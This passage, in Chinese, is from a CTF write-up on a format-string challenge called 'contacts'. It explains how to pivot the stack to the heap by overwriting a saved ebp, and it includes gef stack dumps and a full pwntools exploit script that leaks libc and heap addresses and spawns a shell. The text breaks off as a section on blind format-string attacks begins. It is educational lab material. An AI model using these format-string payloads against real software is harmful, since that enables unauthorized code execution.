\u4f3c\u4e4e\u5e76\u4e0d\u73b0\u5b9e\u3002 \u6ce8\u89e3 \uff1a \u6362\u53e5\u4eba\u8bdd\u5c31\u662f\uff1a\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u76ee\u6807\u5730\u5740\uff0c\u53ea\u80fd\u5728\u6808\u4e0a\u901a\u8fc7\u504f\u79fb\u627e\u5730\u5740\uff0c\u800c\u6808\u4e0a\u6ca1\u6709\u6307\u5411 eip \u7684\u5730\u65b9\uff0c\u4e5f\u5c31\u627e\u4e0d\u5230 eip \u5730\u5740\uff0c\u5c31\u4e0d\u80fd\u4fee\u6539 eip \u7684\u503c\u3002 \u6ce8\u89e3 \uff1a \u5c31\u56e0\u4e3a\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u76ee\u6807\u5730\u5740\uff0c\u6240\u4ee5\u4e0d\u80fd\u7528 hijack GOT \u3001hijack retaddr \u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u6211\u4eec\u8fd8\u6709\u4e4b\u524d\u5728\u6808\u6ea2\u51fa\u8bb2\u7684\u6280\u5de7\uff0cstack pivoting\u3002\u800c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6070\u597d\u662f\u5806\u5185\u5b58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628a\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u53bb\u3002\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7 leave \u6307\u4ee4\u6765\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8fc1\u79fb\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4fee\u6539\u7a0b\u5e8f\u4fdd\u5b58 ebp \u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002 \u53ea\u6709\u8fd9\u6837\u5728\u6267\u884c leave \u6307\u4ee4\u7684\u65f6\u5019\uff0c esp \u624d\u4f1a\u6210\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002\uff08leave \u6307\u4ee4\u7b49\u4e8e\uff1a mov esp,ebp;pop ebp; \uff09 \u540c\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u77e5\u9053\u4fdd\u5b58 ebp \u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u800c\u8fd9\u65f6 PrintInfo \u51fd\u6570\u4e2d\u5b58\u50a8 ebp \u7684\u5730\u5740\u6bcf\u6b21\u90fd\u5728\u53d8\u5316\uff0c\u800c\u6211\u4eec\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5f97\u77e5\u3002\u4f46\u662f\uff0c \u7a0b\u5e8f\u4e2d\u538b\u5165\u6808\u4e2d\u7684 ebp \u503c\u5176\u5b9e\u4fdd\u5b58\u7684\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u4fdd\u5b58 ebp \u503c\u7684\u5730\u5740 \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5176 \u4e0a\u5c42\u51fd\u6570\u7684\u4fdd\u5b58\u7684 ebp \u7684\u503c\uff0c\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\uff08\u5373 main \u51fd\u6570\uff09\u7684 ebp \u6570\u503c \u3002\u8fd9\u6837\u5f53\u4e0a\u5c42\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5373\u5b9e\u73b0\u4e86\u5c06\u6808\u8fc1\u79fb\u5230\u5806\u7684\u64cd\u4f5c\u3002 \u57fa\u672c\u601d\u8def\u5982\u4e0b \u9996\u5148\u83b7\u53d6 system \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u67d0\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6839\u636e libc database \u786e\u5b9a\u3002 \u6784\u9020\u57fa\u672c\u8054\u7cfb\u4eba\u63cf\u8ff0\u4e3a system_addr + 'bbbb' + binsh_addr \u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u4fdd\u5b58\u7684 ebp(\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\u7684 ebp) \u4e3a \u5b58\u50a8 system_addr \u7684\u5730\u5740 -4 \u3002 \u6ce8\u89e3 \uff1a \u4e3a\u4ec0\u662f system_addr \u7684\u5730\u5740 -4 \uff1f\u662f\u56e0\u4e3a\u7a0b\u5e8f\u672b\u5c3e\u7684 leave;ret \u6267\u884c\u5b8c leave \u540e\uff0cesp \u662f\u6307\u5411 ebp \u7684\uff0c\u7136\u540e esp \u7684\u503c\u4f1a\u589e\u52a0\u4e00\u4e2a\u673a\u5668\u957f\u5ea6\uff08\u8fd9\u65f6 esp \u521a\u597d\u662f\u6307\u5411 eip \uff09\uff0c\u518d\u6267\u884c ret \u5c06 esp \u6307\u5411\u7684\u503c\u538b\u5165 eip \u4e2d\u3002 \u5f53\u4e3b\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u4f1a\u6709\u5982\u4e0b\u64cd\u4f5c\uff08\u7b2c\u4e00\u7b2c\u4e8c\u5408\u5e76\u7b49\u4e8e leave \uff09 move esp,ebp\uff0c\u5c06 esp \u6307\u5411 system_addr \u7684\u5730\u5740 - 4 pop ebp\uff0c \u5c06 esp \u6307\u5411 system_addr ret\uff0c\u5c06 eip \u6307\u5411 system_addr\uff0c\u4ece\u800c\u83b7\u53d6 shell\u3002 \u83b7\u53d6\u76f8\u5173\u5730\u5740\u4e0e\u504f\u79fb \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u3001/bin/sh \u5730\u5740\uff0c\u6808\u4e0a\u5b58\u50a8\u8054\u7cfb\u4eba\u63cf\u8ff0\u7684\u5730\u5740\uff0c\u4ee5\u53ca PrintInfo \u51fd\u6570\u7684\u5730\u5740\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6839\u636e\u6808\u4e0a\u5b58\u50a8\u7684 libc_start_main_ret \u5730\u5740 (\u8be5\u5730\u5740\u662f\u5f53 main \u51fd\u6570\u6267\u884c\u8fd4\u56de\u65f6\u4f1a\u8fd0\u884c\u7684\u51fd\u6570) \u6765\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u3001/bin/sh \u5730\u5740\u3002\u6211\u4eec\u6784\u9020\u76f8\u5e94\u7684\u8054\u7cfb\u4eba\uff0c\u7136\u540e\u9009\u62e9\u8f93\u51fa\u8054\u7cfb\u4eba\u4fe1\u606f\uff0c\u5e76\u5c06\u65ad\u70b9\u4e0b\u5728 printf \u5904\uff0c\u5e76\u4e14\u4e00\u76f4\u8fd0\u884c\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684 printf \u51fd\u6570\u5904\uff0c\u5982\u4e0b \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [esp] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [esp] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffccfc', 'l8'] 8 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \"1234567\\n\") [#1] 0x8048c27 \u2192 leave [#2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 [#3] 0x80487a2 \u2192 jmp 0x80487b3 [#4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c) [#5] 0x80485e1 \u2192 hlt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 dereference $esp 140 ['$esp', '140'] 1 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp gef\u27a4 dereference $esp l140 ['$esp', 'l140'] 140 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp 0xffffcd1c\u2502+0x20: 0x08048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 0xffffcd20\u2502+0x24: 0x0804b0a8 \u2192 \"11111\" 0xffffcd24\u2502+0x28: 0x00002b67 (\"g+\"?) 0xffffcd28\u2502+0x2c: 0x0804c410 \u2192 \"11111\" 0xffffcd2c\u2502+0x30: 0x0804c420 \u2192 \"1234567\" 0xffffcd30\u2502+0x34: 0xf7fadd60 \u2192 0xfbad2887 0xffffcd34\u2502+0x38: 0x08048ed6 \u2192 0x25007325 (\"%s\"?) 0xffffcd38\u2502+0x3c: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd3c\u2502+0x40: 0x00000000 0xffffcd40\u2502+0x44: 0xf7fad000 \u2192 0x001b1db0 0xffffcd44\u2502+0x48: 0x00000000 0xffffcd48\u2502+0x4c: 0xffffcd78 \u2192 0x00000000 0xffffcd4c\u2502+0x50: 0x080487a2 \u2192 jmp 0x80487b3 0xffffcd50\u2502+0x54: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd54\u2502+0x58: 0xffffcd68 \u2192 0x00000004 0xffffcd58\u2502+0x5c: 0x00000050 (\"P\"?) 0xffffcd5c\u2502+0x60: 0x00000000 0xffffcd60\u2502+0x64: 0xf7fad3dc \u2192 0xf7fae1e0 \u2192 0x00000000 0xffffcd64\u2502+0x68: 0x08048288 \u2192 0x00000082 0xffffcd68\u2502+0x6c: 0x00000004 0xffffcd6c\u2502+0x70: 0x0000000a 0xffffcd70\u2502+0x74: 0xf7fad000 \u2192 0x001b1db0 0xffffcd74\u2502+0x78: 0xf7fad000 \u2192 0x001b1db0 0xffffcd78\u2502+0x7c: 0x00000000 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 0xffffcd80\u2502+0x84: 0x00000001 0xffffcd84\u2502+0x88: 0xffffce14 \u2192 0xffffd00d \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\" 0xffffcd88\u2502+0x8c: 0xffffce1c \u2192 0xffffd058 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5224\u65ad\u53ef\u4ee5\u5f97\u5230 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 \u5b58\u50a8\u7684\u662f __libc_start_main \u7684\u8fd4\u56de\u5730\u5740\uff0c\u540c\u65f6\u5229\u7528 fmtarg \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a 32\uff0c\u90a3\u4e48\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 31\uff08\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728 0xffffcd00 \uff09\u3002 gef\u27a4 fmtarg 0xffffcd7c The index of format argument : 32 \u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u8fdb\u800c\u53ef\u4ee5\u6839\u636e libc-database \u6765\u83b7\u53d6\u5bf9\u5e94\u7684 libc\uff0c\u7ee7\u800c\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u4e0e /bin/sh \u51fd\u6570\u5730\u5740\u4e86\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740 0xffffcd2c \u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 11\uff0c\u5f97\u5230\u8fd9\u4e2a\u662f\u4e3a\u4e86\u5bfb\u5740\u5806\u4e2d\u6307\u5b9a\u8054\u7cfb\u4eba\u7684 Description \u7684\u5185\u5b58\u9996\u5730\u5740\uff0c\u6211\u4eec\u5c06\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 [system_addr][bbbb][binsh_addr][%6p][p][p][bbbb] \u4fdd\u5b58\u5728\u6307\u5b9a\u8054\u7cfb\u4eba\u7684 Description \u4e2d\u3002 \u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u4e0b\u9762\u7684\u5730\u5740\u4fdd\u5b58\u7740\u4e0a\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5730\u5740\uff0c\u5176\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 6\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u5b58\u50a8\u7684 ebp \u7684\u503c\u3002 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u6784\u9020\u8054\u7cfb\u4eba\u83b7\u53d6\u5806\u5730\u5740 \u5f97\u77e5\u4e0a\u9762\u7684\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u83b7\u53d6\u5806\u5730\u5740\u4e0e\u76f8\u5e94\u7684 ebp \u5730\u5740\u3002 [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb] \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u76f8\u5e94\u7684\u5730\u5740\u3002\u540e\u9762\u7684 bbbb \u662f\u4e3a\u4e86\u63a5\u53d7\u5b57\u7b26\u4e32\u65b9\u4fbf\u3002 \u8fd9\u91cc\u56e0\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\u6240\u7533\u8bf7\u7684\u6808\u7a7a\u95f4\u4e0e\u91ca\u653e\u7684\u7a7a\u95f4\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u7684 ebp \u5730\u5740\u5e76\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002 \u6ce8\u89e3 \uff1a \u56e0\u4e3a PrintInfo \u80af\u5b9a\u662f\u901a\u8fc7 main \u51fd\u6570\u8c03\u7528\u7684\uff0c\u800c main \u51fd\u6570\u4e00\u76f4\u6ca1\u6709\u7ed3\u675f\uff0c\u4e5f\u5c31\u662f\u4e00\u76f4\u5728\u5185\u5b58\u7684\u67d0\u4e00\u56fa\u5b9a\u4f4d\u7f6e\u3002PrintInfo \u662f\u5728 main \u6808\u57fa\u7840\u4e0a\u5f80\u4f4e\u5730\u5740\u751f\u957f\u7684\uff0c\u6240\u4ee5\u53ea\u6709 PrintInfo \u7ed3\u6784\u56fa\u5b9a ebp \u5730\u5740\u4e5f\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002PrintInfo \u7ed3\u6784\u56fa\u5b9a\u662f\u56e0\u4e3a\u6240\u6709\u8f93\u51fa\u5185\u5bb9\uff08\u53f7\u7801\u3001\u63cf\u8ff0\u7b49\uff09\u90fd\u662f\u4ee5\u5806\u5806\u6307\u9488\u5f62\u5f0f\u5b58\u50a8\u7684\uff0c\u4e5f\u5c31\u662f\u65e0\u8bba\u957f\u5ea6\u5982\u4f55\u53d8\u5316\u5728\u6808\u4e0a\u6240\u5728\u7a7a\u95f4\u90fd\u662f\u4e0d\u53d8\u7684\uff0cebp \u7684\u504f\u79fb\u4e5f\u5c31\u662f\u56fa\u5b9a\u4e86\u3002 \u5728\u90e8\u5206\u73af\u5883\u4e0b\uff0csystem \u5730\u5740\u4f1a\u51fa\u73b0 \\ x00\uff0c\u5bfc\u81f4 printf \u7684\u65f6\u5019\u51fa\u73b0 0 \u622a\u65ad\u5bfc\u81f4\u65e0\u6cd5\u6cc4\u9732\u4e24\u4e2a\u5730\u5740\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06 payload \u7684\u4fee\u6539\u5982\u4e0b\uff1a [%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd] payload \u4fee\u6539\u4e3a\u8fd9\u6837\u7684\u8bdd\uff0c\u8fd8\u9700\u8981\u5728 heap \u4e0a\u52a0\u5165 12 \u7684\u504f\u79fb\u3002\u8fd9\u6837\u4fdd\u8bc1\u4e86 0 \u622a\u65ad\u51fa\u73b0\u5728\u6cc4\u9732\u4e4b\u540e\u3002 [%6$p] \uff1a\u4e0a\u5c42\u51fd\u6570 ebp \u5730\u5740\uff1b [%11$p] \uff1a\u5806\u5757 fd \u6307\u9488\u5730\u5740\uff1b \u4fee\u6539 ebp \u7531\u4e8e\u6211\u4eec\u9700\u8981\u6267\u884c leave\uff08 ~~move \u6307\u4ee4\u5c06 ebp \u8d4b\u7ed9 esp\uff0c\u5e76\u8fd8\u9700\u8981\u6267\u884c pop ebp~~ \uff09\u624d\u4f1a\u6267\u884c ret \u6307\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06 ebp \u4fee\u6539\u4e3a\u5b58\u50a8 system \u5730\u5740 -4 \u7684\u503c\u3002\u8fd9\u6837 move esp,ebp \u4e4b\u540e\uff0cesp \u6070\u597d\u6307\u5411\u4fdd\u5b58 system \u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5728\u6267\u884c ret \u6307\u4ee4\u5373\u53ef\u6267\u884c system \u51fd\u6570\u3002 \u4e0a\u9762\u5df2\u7ecf\u5f97\u77e5\u4e86\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684 ebp \u503c\uff0c\u800c\u4e5f\u77e5\u9053\u4e86\u5bf9\u5e94\u7684\u504f\u79fb\u4e3a 6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684 payload \u6765\u8fdb\u884c\u4fee\u6539\u76f8\u5e94\u7684\u503c\u3002(\u8fd9\u91cc\u662f wiki \u7684\u4fee\u6539\u65b9\u6cd5\uff0c\u56e0\u4e3awiki exp \u6211\u672c\u5730\u6253\u4e0d\u901a\uff0c\u6362\u6210\u81ea\u5df1\u7684\uff0c\u6240\u4ee5\u4fee\u6539\u65b9\u6cd5\u4e5f\u4e0d\u4e00\u6837) part1 = (heap_addr - 4) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n' \u83b7\u53d6 shell \u8fd9\u65f6\uff0c\u6267\u884c\u5b8c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4e4b\u540e\uff0c\u9000\u51fa\u5230\u4e0a\u4e0a\u51fd\u6570\uff0c\u6211\u4eec\u8f93\u5165 5 \uff0c\u9000\u51fa\u7a0b\u5e8f\u5373\u4f1a\u6267\u884c ret \u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6 shell\u3002 \u5229\u7528\u7a0b\u5e8f #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : contacts.py from pwn import * context.log_level = 'debug' p = process(\"./contacts\") elf = ELF(\"./contacts\") #libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\") # \u4f7f\u7528\u9898\u76ee\u63d0\u4f9b\u7684libc libc = ELF(\"./libc.so\") def creat(name,number,length,description): p.sendlineafter(\">>> \",'1') p.sendlineafter(\"Name: \",name) p.sendlineafter(\"No: \",number) p.sendlineafter(\"description: \",str(length)) p.sendlineafter(\"description:\\n\",description) def free(name): p.sendlineafter(\">>> \",'2') p.sendlineafter(\"remove? \",name) def edit(name,choose,newname='skye',length=10,description='skye'): p.sendlineafter(\">>> \",'3') p.sendlineafter(\"change? \",name) p.sendlineafter(\">>> \",str(choose)) if(choose==1): p.sendlineafter(\"name: \",newname) elif(choose==2): p.sendlineafter(\"description: \",str(length)) p.sendlineafter(\"Description: \\n\",description) def show(): p.sendlineafter(\">>> \",'4') # leak libc creat(\"skye\",\"skye\",24,'a'*4+\"%31$p\") show() p.recvuntil('a'*4) libc_start_main = int(p.recv(10),16) log.info(\"libc_start_main:\"+hex(libc_start_main)) libc_base = libc_start_main - 0x18637 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + libc.symbols['system'] log.info(\"system_addr:\"+hex(system_addr)) binsh_addr = libc_base + libc.search('sh\\x00').next() log.info(\"binsh_addr:\"+hex(binsh_addr)) # leak ebp&heap addr # \u5c06system\u524d\u7f6e\u53ef\u80fd\u4f1a\u9047\u5230\\x00\u963b\u65ad\uff0c\u53ef\u81ea\u884c\u540e\u7f6e\uff0c\u5e76\u8c03\u6574ebp\u8986\u76d6\u503c payload = p32(system_addr) + 'bbbb' + p32(binsh_addr) + '%6$p%11$pcccc' creat('2222', 'skye', 0x20, payload) show() p.recvuntil('Description: ') data = p.recvuntil('cccc', drop=True) data = data.split('0x') ebp_addr = int(data[-2], 16) log.info(\"ebp_addr:\"+hex(ebp_addr)) heap_addr = int(data[-1], 16) log.info(\"heap_addr:\"+hex(heap_addr)) # overwrite main_ebp payload = '%{}c%6$n'.format(str(heap_addr-4)) creat('3333', 'skye', 68, payload) #gdb.attach(p,'b *0x0804876A') #raw_input('pause') show() #getshell p.recvuntil('>>> ') p.sendline('5') p.interactive() \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u6837\u5e76\u4e0d\u80fd\u7a33\u5b9a\u5f97\u5230 shell\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u6b21\u6027\u8f93\u5165\u4e86\u592a\u957f\u7684\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6211\u4eec\u53c8\u6ca1\u6709\u529e\u6cd5\u5728\u524d\u9762\u63a7\u5236\u6240\u60f3\u8981\u8f93\u5165\u7684\u5730\u5740\u3002\u53ea\u80fd\u8fd9\u6837\u4e86\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981\u6253\u5370\u8fd9\u4e48\u591a\u5462\uff1f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e0d\u5728\u6808\u4e0a\uff0c\u6240\u4ee5\u5c31\u7b97\u6211\u4eec\u5f97\u5230\u4e86\u9700\u8981\u66f4\u6539\u7684 ebp \u7684\u5730\u5740\uff0c\u4e5f\u6ca1\u6709\u529e\u6cd5\u53bb\u628a\u8fd9\u4e2a\u5730\u5740\u5199\u5230\u6808\u4e0a\uff0c\u5229\u7528 $ \u7b26\u53f7\u53bb\u5b9a\u4f4d\u4ed6\uff1b\u56e0\u4e3a\u6ca1\u6709\u529e\u6cd5\u5b9a\u4f4d\uff0c\u6240\u4ee5\u6ca1\u6709\u529e\u6cd5\u7528 hn\\hhn \u7b49\u65b9\u5f0f\u53bb\u5199\u8fd9\u4e2a\u5730\u5740\uff0c\u53ea\u80fd\u7528 n \u65b9\u5f0f\u53bb\u5199\uff0c\u6240\u4ee5\u6253\u5370\u5f88\u591a\u3002 \u6ce8\u89e3 \uff1a \u6211\u7684\u811a\u672c\u4e2d\u7528\u7684\u4e0d\u662f system('/bin/sh') \uff0c\u800c\u662f system('sh') \uff0c\u8fd9\u662f\u56e0\u4e3a\u7528\u9898\u76ee\u63d0\u4f9b\u7684 libc \u641c\u7d22 /bin/sh \u5f97\u5230\u7ed3\u679c\u6709\u8bef\uff0c\u5f97\u5230\u7684\u5730\u5740\u4e0d\u662f /bin/sh \uff1a \u800c\u53bb\u5230 libcdatabase \u5f97\u5230\u7ed3\u679c\u662f\uff1a 0xf7f60a0b \uff0c\u91cc\u9762\u6709\u4e00\u4e2a 0x0a \u5c31\u662f\u6362\u884c\u7b26\u561b\uff0c\u8fd9\u6837\u4f1a\u63d0\u524d\u7ec8\u6b62\u8f93\u5165\uff0c\u6240\u4ee5\u4e5f\u4e0d\u884c\u3002\u6700\u540e\u4f7f\u7528\u9898\u76ee\u63d0\u4f9b libc \u641c\u7d22 sh \uff0c\u6210\u529f getshell \u3002 \u5728\u6211\u7684\u73af\u5883\uff08Ubuntu 16.04\uff09\u6ca1\u6709\u9047\u5230 system \\x00 \u963b\u65ad\uff0c\u6240\u4ee5 payload \u4e2d system \u524d\u7f6e\u3002\u5982\u679c\u9047\u5230\u963b\u65ad\uff0c\u5c31\u5c06 system \u540e\u7f6e\uff0c\u5e76\u8c03\u6574 ebp \u8986\u76d6\u5185\u5bb9\u52a0\u4e0a\u504f\u79fb\u5373\u53ef\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 ctf-wiki \u4e0a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4ecb\u7ecd\u4e0d\u662f\u5f88\u5168\u9762\uff0c\u6211\u67e5\u4e86\u5176\u4ed6\u5927\u4f6c\u7684\u7b14\u8bb0\uff0c\u81ea\u5df1\u603b\u7ed3\u4e86\uff1a Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u539f\u7406 \u6240\u8c13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u8fdb\u884c pwn\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP 